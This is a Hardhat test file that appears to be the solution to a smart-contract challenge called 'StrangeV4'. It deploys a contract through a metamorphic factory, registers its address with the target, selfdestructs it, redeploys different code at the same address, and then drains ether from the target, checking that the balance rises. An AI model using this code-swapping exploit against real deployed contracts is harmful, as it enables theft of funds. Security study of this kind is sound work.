const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('StrangeV4 Solution1: using MetamorphicContractFactory by 0age', function () {
  let deployer;
  let strangeV4, metamorphicContractFactory, implementation1, implementation2;
  let metamorphicContractAddress;

  before(
    'Deploy MetamorphicContractFactory and Implementation1',
    async function () {
      [deployer] = await ethers.getSigners();

      /** Deploy StrangeV4 */
      const StrangeV4 = await ethers.getContractFactory('StrangeV4', deployer);
      strangeV4 = await StrangeV4.connect(deployer).deploy({
        value: ethers.utils.parseEther('1'),
      });
      await strangeV4.deployed();

      /** Deploy MetamorphicContractFactory */
      const MetamorphicContractFactory = await ethers.getContractFactory(
        'MetamorphicContractFactory',
        deployer
      );
      metamorphicContractFactory = await MetamorphicContractFactory.deploy(
        '0x00'
      );
      await metamorphicContractFactory.deployed();

      /** Deploy Implementation1 */
      const Implementation1 = await ethers.getContractFactory(
        'Implementation1'
      );
      implementation1 = await Implementation1.deploy();
      await implementation1.deployed();

      /** Deploy Implementation2 */
      const Implementation2 = await ethers.getContractFactory(
        'Implementation2'
      );
      implementation2 = await Implementation2.deploy();
      await implementation2.deployed();
    }
  );

  it('Create metamorphic contract', async function () {
    /**
     * MetamorphicContractFactory will copy the code from Implementation1 contract
     * and deploy a contract that copied code
     * This emits Metamorphosed event
     */
    const SALT = deployer.address + '000000000000000000000000';
    let tx =
      await metamorphicContractFactory.deployMetamorphicContractFromExistingImplementation(
        SALT,
        implementation1.address,
        '0x'
      );
    let receipt = await tx.wait();

    // fetch address of the metamorphicContract created by
    // calling deployMetamorphicContractFromExistingImplementation from emitted event
    metamorphicContractAddress = receipt.events.filter(
      (x) => x.event === 'Metamorphosed'
    )[0].args.metamorphicContract;

    tx = await strangeV4.initialize(metamorphicContractAddress);
    await tx.wait();

    // selfdestruct Implementation1
    const metamorphicContract = new ethers.Contract(
      metamorphicContractAddress,
      implementation1.interface,
      deployer
    );
    await (await metamorphicContract.killme()).wait();

    // deploy Implementation2 with same address
    tx =
      await metamorphicContractFactory.deployMetamorphicContractFromExistingImplementation(
        SALT,
        implementation2.address,
        '0x'
      );
    receipt = await tx.wait();
  });

  it('Success', async function () {
    // balance of deployer before calling success
    const beforeBalance = await ethers.provider.getBalance(deployer.address);

    const tx = await strangeV4.success(metamorphicContractAddress);
    await tx.wait();

    const afterBalance = await ethers.provider.getBalance(deployer.address);

    expect(parseInt(afterBalance.sub(beforeBalance))).to.be.greaterThan(0);
  });
});
